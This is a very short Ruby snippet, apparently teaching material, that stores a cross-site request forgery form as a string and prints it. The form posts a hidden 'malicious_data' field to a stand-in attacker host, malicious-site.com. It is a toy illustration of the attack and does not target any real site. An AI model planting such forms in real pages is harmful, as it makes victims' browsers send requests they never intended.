# CSRF Example
user_input_csrf = "<form action='https://malicious-site.com/attack' method='POST'><input type='hidden' name='data' value='malicious_data'></form>"

# Usage of the CSRF example
puts "CSRF Example: #{user_input_csrf}"

